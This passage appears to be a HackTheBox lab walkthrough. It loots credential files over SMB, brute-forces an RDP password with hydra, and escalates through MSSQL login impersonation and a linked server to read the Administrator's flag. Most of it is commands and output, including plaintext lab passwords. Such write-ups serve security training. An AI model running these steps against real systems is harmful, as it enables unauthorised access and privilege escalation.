+getting file \IT\John\secrets.txt of size 99 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \IT\John\> cd ../Simon
+smb: \IT\Simon\> ls
+  .                                   D        0  Fri Apr 22 02:16:07 2022
+  ..                                  D        0  Fri Apr 22 02:16:07 2022
+  random.txt                          A       94  Fri Apr 22 02:16:48 2022
+
+                7706623 blocks of size 4096. 3141769 blocks available
+smb: \IT\Simon\> mget *
+Get file random.txt? y
+getting file \IT\Simon\random.txt of size 94 as random.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \IT\Simon\> !cat random.txt 
+Credentials
+
+(k20ASD10934kadA
+KDIlalsa9020$
+JT9ads02lasSA@
+Kaksd032klasdA#
+LKads9kasd0-@smb: \IT\Simon\> get random.txt 
+getting file \IT\Simon\random.txt of size 94 as random.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \IT\Simon\> SMBecho failed (NT_STATUS_INVALID_NETWORK_RESPONSE). The connection is disconnected now
+
+```
+
+
+2. Enumerate the target and find a password for the user Fiona. What is her password? 
+
+For that we need to utilize the creds.txt file that we obtained in the Home share in IT/Fiona directory
+```c
+hydra -l Fiona -P creds.txt 10.129.214.228 rdp
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 12:52:41
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task
+[DATA] attacking rdp://10.129.214.228:3389/
+[3389][rdp] host: 10.129.214.228   login: Fiona   password: 48Ns72!bns74@S84NNNSl
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+
+```
+
+
+4. Once logged in, what other user can we compromise to gain admin privileges? 
+
+As from the share results inside IT directory we saw 3 users and the one haven't appeared in the questions yet is `john` so it's correct answer
+
+Then open powershell and use sqlcmd tool:
+
+6. Submit the contents of the flag.txt file on the Administrator Desktop. 
+
+We need to rdp to Windows machine via rdesktop
+```c
+rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' 10.129.214.228 
+```
+
+So now we find out the user actually and impersonate as him to gain admin privileges:
+```c
+PS C:\Users\Fiona> sqlcmd                                                                                                            
+1> SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES;                                                                          
+2> go                                                                                                                                table_name                                                                                                                           
+--------------------------------------------------------------------------------------------------------------------------------     spt_fallback_db                                                                                                                      spt_fallback_dev                                                                                                                     spt_fallback_usg                                                                                                                     spt_values                                                                                                                           spt_monitor                                                                                                                                                                                                                                                               
+(5 rows affected)                                                                                                                    
+1> EXECUTE AS LOGIN = 'john';                                                                                                        
+2> SELECT SYSTEM_USER;                                                                                                               
+3> SELECT IS_SRVROLEMEMBER('sysadmin');                                                                                              
+4> go                                                                                                                                                                                                                                                                     
+--------------------------------------------------------------------------------------------------------------------------------     
+john                                                                                                                                                                                                                                                                      
+(1 rows affected)                                                                                                                                                                                                                                                         
+-----------                                                                                                                                    0                                                                                                                                                                                                                                                               
+(1 rows affected)                                                                                                                    
+1> SELECT srvname, isremote FROM sysservers;                                                                                         
+2> go                                                                                                                                
+srvname                                                                                                                          
+isremote                                                                                                                                 
+----------------------------------------------------------------------------------------------------------------------------------------                                                                                                                                 
+WINSRV02\SQLEXPRESS                                                                                                                     1                                                                                                                                 LOCAL.TEST.LINKED.SRV                                                                                                                   0                                                                                                                                                                                                                                                                      
+(2 rows affected)                                                                                                                    
+1> EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];                
+2> go                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                                                                                
+WINSRV02\SQLEXPRESS                                                                                                              
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)                                                                                              Sep 24 2019 13:48:23                                                                                                                 Copyright (C) 2019 Microsoft Corporation                                                                                             
+Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)                                                                                                                  
+testadmin                                                                                                                                  
+1                                                                                                                                                                        
+(1 rows affected)                                                                                                                    
+1> execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];                                                                                                                          
+2> go                                                                                                                                BulkColumn                                                                                                                           
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+HTB{46******}                                                                                                                                                                                                                                               
+(1 rows affected) 
+```
